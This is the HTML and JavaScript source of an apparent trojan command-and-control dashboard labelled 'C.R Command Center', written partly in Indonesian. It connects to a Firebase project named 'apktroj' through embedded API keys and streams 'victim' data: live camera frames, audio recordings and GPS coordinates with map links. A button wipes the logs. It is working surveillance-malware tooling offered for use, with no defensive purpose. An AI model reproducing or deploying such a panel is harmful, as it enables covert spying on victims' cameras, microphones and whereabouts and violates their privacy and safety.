<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R Monitoring V1.2 - Live Stream</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        .victim-card { background: #111; border: 1px solid #222; border-radius: 8px; transition: 0.3s; }
        .victim-card:hover { border-color: #ff0000; }
        .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
        .tab-btn.active { border-color: #ff0000; color: #ff0000; }
        .purge-btn { background: #440000; color: #ff0000; border: 1px solid #ff0000; transition: 0.3s; }
        .purge-btn:hover { background: #ff0000; color: #fff; box-shadow: 0 0 15px #ff0000; }
        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body class="p-4">
    <div class="max-w-6xl mx-auto">
        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
            <div>
                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER</h1>
                <p class="text-xs text-gray-500">PROTOTYPE V1.2 | OWNER: GIGS | STATUS: <span class="animate-ping">●</span> ONLINE</p>
            </div>
            <div class="flex flex-col items-end">
                <button id="purge-all" class="purge-btn px-4 py-2 text-xs font-bold rounded mb-2 uppercase">Purge All Data</button>
                <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
            </div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <div class="lg:col-span-1 border-r border-green-900 pr-4">
                <h2 class="text-lg font-bold mb-4 border-b border-green-900">VICTIM LIST</h2>
                <div id="victim-list" class="space-y-2 max-h-[70vh] overflow-y-auto"></div>
            </div>

            <div class="lg:col-span-3">
                <div class="flex space-x-4 mb-4 border-b border-gray-800">
                    <div class="tab-btn active" id="tab-live">LIVE CAMERA</div>
                    <div class="tab-btn" id="tab-log">ACTIVITY LOGS</div>
                    <div class="tab-btn" id="tab-geo">GEOLOCATION</div>
                </div>

                <!-- Live Stream Panel -->
                <div id="content-live" class="space-y-4">
                    <div class="glitch-border p-4 bg-black">
                        <div class="flex justify-between items-center mb-2">
                            <h3 class="text-red-500 font-bold uppercase">Target View: <span id="target-id">None</span></h3>
                            <span class="live-indicator" id="live-status">● DISCONNECTED</span>
                        </div>
                        <div id="live-display" class="w-full aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden relative">
                            <img id="stream-img" src="" class="w-full h-full object-contain hidden">
                            <span id="stream-placeholder" class="text-gray-700">Waiting for live feed...</span>
                            <div class="absolute top-2 left-2 bg-black bg-opacity-50 p-1 text-[10px] text-white" id="stream-ts"></div>
                        </div>
                        <div class="mt-4">
                            <h3 class="text-blue-500 mb-2 font-bold">LATEST AUDIO LOGS</h3>
                            <div id="audio-container" class="grid grid-cols-1 gap-2 max-h-40 overflow-y-auto"></div>
                        </div>
                    </div>
                </div>

                <div id="content-log" class="hidden space-y-2">
                    <div id="logs-container" class="max-h-[60vh] overflow-y-auto"></div>
                </div>

                <div id="content-geo" class="hidden">
                    <div id="map-info" class="glitch-border p-4 bg-black min-h-[300px]">
                        <p class="text-yellow-500 font-bold">COORD: <span id="lat-long">0.0, 0.0</span></p>
                        <p class="text-white mt-2">MAP LINK: <a id="map-link" href="#" target="_blank" class="text-blue-400 underline italic">Open Google Maps</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="confirm-modal" class="fixed inset-0 bg-black bg-opacity-90 z-50 hidden flex items-center justify-center">
        <div class="border border-red-500 p-8 bg-black max-w-sm text-center">
            <h2 class="text-red-500 text-2xl font-bold mb-4">DANGER ZONE</h2>
            <p class="text-white mb-6">Hapus semua data permanen?</p>
            <div class="flex space-x-4 justify-center">
                <button id="cancel-purge" class="px-6 py-2 border border-gray-500 text-gray-500">BATAL</button>
                <button id="confirm-purge" class="px-6 py-2 bg-red-600 text-white font-bold">YA, BERSIHKAN!</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, getDocs, deleteDoc, doc, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab",
            measurementId: "G-WR01BDY3G6"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";

        onAuthStateChanged(auth, async (user) => {
            if (!user) await signInAnonymously(auth);
            else {
                document.getElementById('auth-info').innerText = "CORE CONNECTED: " + user.uid;
                initApp();
            }
        });

        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const target = btn.id.replace('tab-', 'content-');
                ['content-live', 'content-log', 'content-geo'].forEach(id => {
                    document.getElementById(id).classList.toggle('hidden', id !== target);
                });
            });
        });

        document.getElementById('purge-all').onclick = () => document.getElementById('confirm-modal').classList.remove('hidden');
        document.getElementById('cancel-purge').onclick = () => document.getElementById('confirm-modal').classList.add('hidden');
        
        document.getElementById('confirm-purge').onclick = async () => {
            const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
            const snapshot = await getDocs(logsRef);
            snapshot.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'victim_logs', d.id)));
            location.reload();
        };

        function initApp() {
            const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
            
            onSnapshot(logsRef, (snap) => {
                const logCont = document.getElementById('logs-container');
                const vicList = document.getElementById('victim-list');
                const streamImg = document.getElementById('stream-img');
                const streamPlace = document.getElementById('stream-placeholder');
                
                logCont.innerHTML = '';
                vicList.innerHTML = '';

                snap.forEach(docSnap => {
                    const data = docSnap.data();
                    
                    // Simple Log
                    const div = document.createElement('div');
                    div.className = 'victim-card p-2 mb-1 text-[10px]';
                    div.innerText = `[${new Date(data.timestamp).toLocaleTimeString()}] ${data.action}`;
                    logCont.prepend(div);

                    // Live Stream Update (Always show latest photo/frame)
                    if(data.action === "LIVE_FRAME" || data.photo) {
                        const imgData = data.frame || data.photo;
                        streamImg.src = imgData;
                        streamImg.classList.remove('hidden');
                        streamPlace.classList.add('hidden');
                        document.getElementById('target-id').innerText = data.uid.substring(0,8);
                        document.getElementById('live-status').innerText = "● LIVE";
                        document.getElementById('stream-ts').innerText = new Date(data.timestamp).toLocaleString();
                    }

                    if(data.audio) {
                        const aud = document.createElement('audio');
                        aud.controls = true; aud.src = data.audio; aud.className = "h-8 w-full mt-1";
                        document.getElementById('audio-container').prepend(aud);
                    }

                    if(data.location) {
                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
                        document.getElementById('map-link').href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
                    }
                });
            });
        }
    </script>
</body>
</html>
